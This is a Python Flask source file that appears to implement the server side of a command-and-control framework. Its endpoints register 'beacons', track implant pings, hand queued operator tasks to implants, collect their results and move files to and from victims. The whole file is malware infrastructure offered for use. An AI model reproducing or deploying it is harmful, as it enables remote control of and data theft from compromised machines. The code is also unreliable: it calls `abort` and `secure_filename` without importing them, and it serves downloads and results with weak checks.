#!/usr/bin/python3
import json
import os
import datetime

from flask import request, Response, send_from_directory, jsonify
from flask_restful import Resource
from database.db import initialize_db
from database.models import Task, Result, TaskHistory, Register, Pinger

my_list = []
UPLOAD_DIRECTORY = "./api_uploaded_files"

if not os.path.exists(UPLOAD_DIRECTORY):
    os.makedirs(UPLOAD_DIRECTORY)

class Fileslist(Resource):
    """Endpoint to list files on the server."""
    def get(self):
        files = []
        for filename in os.listdir(UPLOAD_DIRECTORY):
            path = os.path.join(UPLOAD_DIRECTORY, filename)
            if os.path.isfile(path):
                files.append(filename)
        return jsonify(files)

class Filesdownload(Resource):
    """Download a file."""
    def get(self, path):
        return send_from_directory(UPLOAD_DIRECTORY, path, as_attachment=True)

class Filesupload(Resource):  
    """Upload a file."""
    def post(self, filename):
        if "/" in filename:
            # Return 400 BAD REQUEST
            abort(400, "no subdirectories allowed")

        if 'Filedata' not in request.files:
            return "Missing <Filedata>", 400
        
        if filename == '':
            return "No File Name!", 400

        file = request.files['Filedata']
        filename = secure_filename(file.filename)
        file.save(os.path.join(UPLOAD_DIRECTORY, filename))

        # Return 201 CREATED
        return "File Uploaded!", 201


class Registers(Resource):
    def get(self):
        # Get all the objects and return them to the user
        registers = Register.objects().to_json()
        Register.objects().delete()
        return Response(registers, mimetype="application/json", status=200)
    
    def post(self):
        # Check if results from the implant are populated
        if str(request.get_json()) != '{}':
            # Parse out the result JSON that we want to add to the database
            body = request.get_json()
            print("Beacon Connected: {}".format(body))
            json_obj = json.loads(json.dumps(body))
            for key in json_obj.keys():
                # Look for beacon UUID and add it to our list
                if (key == "beacon_id"):
                    my_list.append(json_obj[key])
            Register(**json_obj).save()
            return "Sucess!", 200
        else:
            return "Failed!", 400

class Ping(Resource):
    def post(self,beaconid):
        # Check if results from the implant are populated
        if str(request.get_json()) != '{}':
            # Parse out the result JSON that we want to add to the database
            body = request.get_json()
            json_obj = json.loads(json.dumps(body))
            data = Pinger.objects().to_json()

            if beaconid not in data:
                date_time = datetime.datetime.now().strftime("%H:%M:%S")
                json_obj['last_alive'] = date_time
                Pinger(**json_obj).save()
            else:
                date_time = datetime.datetime.now().strftime("%H:%M:%S")
                beacon = Pinger.objects(beacon_id=beaconid).first()
                beacon.update(last_alive=date_time)
            
            return "Success!", 200
        else:
            return "Failed!", 400

class CheckPings(Resource):
    def get(self):
        # Get all the objects and return them to the user
        ping = Pinger.objects().to_json()
        #Pinger.objects().delete()
        return Response(ping, mimetype="application/json", status=200)

class Tasks(Resource):
    # ListTasks
    def get(self):
        # Get all the task objects and return them to the user
        tasks = Task.objects().to_json()
        return Response(tasks, mimetype="application/json", status=200)

    # AddTasks
    def post(self):
        # Parse out the JSON body we want to add to the database
        body = request.get_json()
        json_obj = json.loads(json.dumps(body))
        # Get the number of Task objects in the request
        obj_num = len(body)
        # For each Task object, add it to the database
        for i in range(obj_num):
            # Add a task UUID to each task object for tracking
            #json_obj[i]['task_id'] = uuid_b #str(uuid.uuid4())
            # Save Task object to database
            Task(**json_obj[i]).save()
            # Load the options provided for the task into an array for tracking in history
            task_options = []
            for key in json_obj[i].keys():
                # Anything that comes after task_type and task_id is treated as an option
                if (key != "task_type" and key != "task_id"):
                    task_options.append(key + ": " + json_obj[i][key])
            # Add to task history
            TaskHistory(
                task_id=json_obj[i]['task_id'],
                task_type=json_obj[i]['task_type'],
                task_object=json.dumps(json_obj),
                task_options=task_options,
                task_results=""
            ).save()
        # Return the last Task objects that were added
        return Response(Task.objects.skip(Task.objects.count() - obj_num).to_json(),
                        mimetype="application/json",
                        status=200)


class Results(Resource):
    # ListResults
    def get(self,beacon_id):
        if beacon_id in my_list:
            results = Result.objects().to_json()
            Result.objects().delete()
            return Response(results, mimetype="application/json", status=200) # Get all the result objects and return them to the user
        else:
            return Response("Not Found", mimetype="text", status=404)

    # AddResults
    def post(self,beacon_id):
        # Check if results from the implant are populated
        if str(request.get_json()) != '{}':
            # Parse out the result JSON that we want to add to the database
            body = request.get_json()
            #print("Received implant response: {}".format(body))
            json_obj = json.loads(json.dumps(body))
            # Add a result UUID to each result object for tracking
            json_obj['result_id'] = sorted(json_obj.keys())[0]
            Result(**json_obj).save()
            # Serve latest tasks to implant
            tasks = Task.objects().to_json()
            json_obj = json.loads(json.dumps(tasks))
            if beacon_id in json_obj:
                # Clear tasks so they don't execute twice
                Task.objects().delete()
                return Response(tasks, mimetype="application/json", status=200)
            else:
                return Response("{}", mimetype="application/json", status=200)
        else:
            # Serve latest tasks to implant
            tasks = Task.objects().to_json()
            json_obj = json.loads(json.dumps(tasks))
            if beacon_id in json_obj:
                Task.objects().delete()
                return Response(tasks, mimetype="application/json", status=200)
            else:
                # Clear tasks so they don't execute twice
                #Task.objects().delete()
                return Response("{}", mimetype="application/json", status=200)


class History(Resource):
    # ListHistory
    def get(self):
        # Get all the task history objects so we can return them to the user
        task_history = TaskHistory.objects().to_json()
        # Update any served tasks with results from implant
        # Get all the result objects and return them to the user
        results = Result.objects().to_json()
        json_obj = json.loads(results)
        # Format each result from the implant to be more friendly for consumption/display
        result_obj_collection = []
        for i in range(len(json_obj)):
            for field in json_obj[i]:
                result_obj = {
                    "task_id": field,
                    "task_results": json_obj[i][field]
                }
                result_obj_collection.append(result_obj)
        # For each result in the collection, check for a corresponding task ID and if
        # there's a match, update it with the results. This is hacky and there's probably
        # a more elegant solution to update tasks with their results when they come in...
        for result in result_obj_collection:
            if TaskHistory.objects(task_id=result["task_id"]):
                TaskHistory.objects(task_id=result["task_id"]).update_one(
                    set__task_results=result["task_results"])
        return Response(task_history, mimetype="application/json", status=200)